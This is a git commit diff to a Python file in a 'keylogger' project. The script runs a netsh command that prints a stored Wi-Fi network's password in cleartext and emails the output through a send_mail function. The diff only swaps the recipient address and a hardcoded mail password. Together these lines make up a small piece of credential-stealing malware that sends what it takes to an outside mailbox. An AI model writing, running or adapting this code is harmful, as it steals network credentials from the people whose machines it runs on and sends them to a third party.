932d4dbcc156e4a99f29c4490ff18c3a227e5a1f
SANJSAI <72964009+SANJSAI@users.noreply.github.com>
2023-05-06 15:27:12 +0530

    execute_and_report.py

--- keylogger/execute_and_report.py
+++ keylogger/execute_and_report.py
@@ -10,4 +10,4 @@ def send_mail(self, email, password, message):
 
 command = "netsh wlan show profile UPC723762 key=clear"
 result = subprocess.check_output(command, shell=True)
-send_mail("niyega3919@syinxun.com", "abc123abc12", result)
+send_mail("reportkeylogger123@gmail.com", "Abc123@keylogger", result)
